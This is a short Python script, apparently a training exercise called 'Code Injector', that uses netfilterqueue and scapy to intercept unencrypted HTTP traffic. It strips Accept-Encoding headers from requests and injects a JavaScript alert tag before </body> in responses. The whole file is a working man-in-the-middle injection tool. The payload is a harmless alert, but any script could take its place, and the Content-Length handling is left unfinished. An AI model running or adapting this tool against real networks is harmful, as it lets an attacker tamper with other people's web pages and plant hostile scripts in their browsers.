#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw
from Utilities.utils import set_load
import re

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        load = scapy_packet[Raw].load
        encoding_pattern = "Accept-Encoding:.*?\\r\\n"
        content_length_pattern = "(?:Content-Length:\s)(\d*)"
        if scapy_packet[TCP].dport == 80:
            print("\n[+] This is an HTTP Request:")
            load = re.sub(encoding_pattern, "", load)
        elif scapy_packet[TCP].sport == 80:
            print("\n[+] This is a HTTP Response:\n")
            # print(scapy_packet.show())
            load = load.replace("</body>", "<script>alert('Hello World!')</script></body>")
            content_length_search = re.search(content_length_pattern, load)
            if content_length_search:
                content_length = content_length_search.group(1)
                print("\n\n[+] This is our Content Length:")
                print(content_length)

        if load != scapy_packet[Raw].load:
            new_packet = set_load(scapy_packet, load)   # Create a new packet with the modified load
            packet.set_payload(str(new_packet))         # Set the new packet as the main packet
    packet.accept()
    return None

print("\n[+] Hello World, this is Code Injector!")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()